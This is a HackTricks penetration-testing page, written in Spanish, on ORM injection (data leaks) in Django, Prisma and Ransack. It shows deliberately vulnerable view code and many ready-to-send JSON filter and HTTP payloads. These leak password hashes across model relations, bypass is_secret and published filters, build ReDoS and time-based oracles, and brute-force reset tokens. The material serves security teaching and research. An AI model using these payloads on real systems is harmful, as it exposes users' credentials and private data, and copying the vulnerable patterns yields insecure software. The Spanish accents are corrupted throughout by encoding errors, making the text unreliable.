# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

En [**esta publicaci칩n**](https://www.elttam.com/blog/plormbing-your-django-orm/) se explica c칩mo es posible hacer que un Django ORM sea vulnerable utilizando, por ejemplo, un c칩digo como:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Una vista API b치sica a la que los usuarios env칤an solicitudes para
buscar art칤culos
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Nota c칩mo todos los request.data (que ser치 un json) se pasan directamente a **filtrar objetos de la base de datos**. Un atacante podr칤a enviar filtros inesperados para filtrar m치s datos de los esperados.

Ejemplos:

* **Login:** En un inicio de sesi칩n simple, intenta filtrar las contrase침as de los usuarios registrados dentro de 칠l.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Es posible realizar un ataque de fuerza bruta a la contrase침a hasta que se filtre.
{% endhint %}

* **Filtrado relacional**: Es posible recorrer relaciones para filtrar informaci칩n de columnas que ni siquiera se esperaban usar en la operaci칩n. Por ejemplo, si es posible filtrar art칤culos creados por un usuario con estas relaciones: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Es posible encontrar la contrase침a de todos los usuarios que han creado un art칤culo
{% endhint %}

* **Filtrado relacional de muchos a muchos**: En el ejemplo anterior no pudimos encontrar las contrase침as de los usuarios que no han creado un art칤culo. Sin embargo, siguiendo otras relaciones esto es posible. Por ejemplo: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
En este caso, podemos encontrar todos los usuarios en los departamentos de usuarios que han creado art칤culos y luego filtrar sus contrase침as (en el json anterior solo estamos filtrando los nombres de usuario, pero luego es posible filtrar las contrase침as).
{% endhint %}

* **Abusando de las relaciones muchos-a-muchos de Grupo y Permiso con usuarios en Django**: Adem치s, el modelo AbstractUser se utiliza para generar usuarios en Django y, por defecto, este modelo tiene algunas **relaciones muchos-a-muchos con las tablas de Permiso y Grupo**. Lo que b치sicamente es una forma predeterminada de **acceder a otros usuarios desde un usuario** si est치n en el **mismo grupo o comparten el mismo permiso**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Bypass filter restrictions**: La misma publicaci칩n del blog propuso eludir el uso de algunos filtros como `articles = Article.objects.filter(is_secret=False, **request.data)`. Es posible volcar art칤culos que tienen is\_secret=True porque podemos retroceder desde una relaci칩n a la tabla Article y filtrar art칤culos secretos de art칤culos no secretos porque los resultados est치n unidos y el campo is\_secret se verifica en el art칤culo no secreto mientras se filtran los datos del art칤culo secreto.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Abusando de las relaciones, es posible eludir incluso los filtros destinados a proteger los datos mostrados.
{% endhint %}

* **Error/Time based via ReDoS**: En los ejemplos anteriores se esperaba tener diferentes respuestas si el filtrado funcionaba o no para usar eso como or치culo. Pero podr칤a ser posible que se realice alguna acci칩n en la base de datos y la respuesta sea siempre la misma. En este escenario, podr칤a ser posible provocar un error en la base de datos para obtener un nuevo or치culo.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
De la misma publicaci칩n sobre este vector:

* **SQLite**: No tiene un operador regexp por defecto (requiere cargar una extensi칩n de terceros)
* **PostgreSQL**: No tiene un tiempo de espera de regex por defecto y es menos propenso a retrocesos
* **MariaDB**: No tiene un tiempo de espera de regex

## Prisma ORM (NodeJS)

Los siguientes son [**trucos extra칤dos de esta publicaci칩n**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Control total de b칰squeda**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// El atacante tiene control total de todas las opciones de prisma
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Es posible ver que todo el cuerpo de javascript se pasa a prisma para realizar consultas.

En el ejemplo de la publicaci칩n original, esto verificar칤a todas las publicaciones creadas por alguien (cada publicaci칩n es creada por alguien) devolviendo tambi칠n la informaci칩n del usuario de esa persona (nombre de usuario, contrase침a...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
```markdown
El siguiente selecciona todas las publicaciones creadas por alguien con una contrase침a y devolver치 la contrase침a:
```
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Control total de la cl치usula where**:

Veamos esto donde el ataque puede controlar la cl치usula `where`:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Vulnerable to ORM Leaks
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Es posible filtrar la contrase침a de los usuarios directamente como:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
Usando operaciones como `startsWith` es posible filtrar informaci칩n.&#x20;
{% endhint %}

* **Elusi칩n de filtrado relacional de muchos a muchos:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Es posible filtrar art칤culos no publicados al retroceder a las relaciones de muchos a muchos entre `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Tambi칠n es posible leak todos los usuarios abusando de algunas relaciones de muchos a muchos de bucle.
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Consultas de error/temporalizadas**: En la publicaci칩n original puedes leer un conjunto muy extenso de pruebas realizadas para encontrar la carga 칰til 칩ptima para filtrar informaci칩n con una carga 칰til basada en el tiempo. Esto es:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Donde `{CONTAINS_LIST}` es una lista con 1000 cadenas para asegurarse de que **la respuesta se retrase cuando se encuentra la fuga correcta.**

## **Ransack (Ruby)**

Estos trucos fueron [**encontrados en esta publicaci칩n**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Tenga en cuenta que Ransack 4.0.0.0 ahora impone el uso de una lista de permitidos expl칤cita para atributos y asociaciones buscables.**
{% endhint %}

**Ejemplo vulnerable:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Nota c칩mo la consulta ser치 definida por los par치metros enviados por el atacante. Fue posible, por ejemplo, forzar el token de restablecimiento con:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
Al forzar y potencialmente relacionar, fue posible filtrar m치s datos de una base de datos.

## Referencias

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
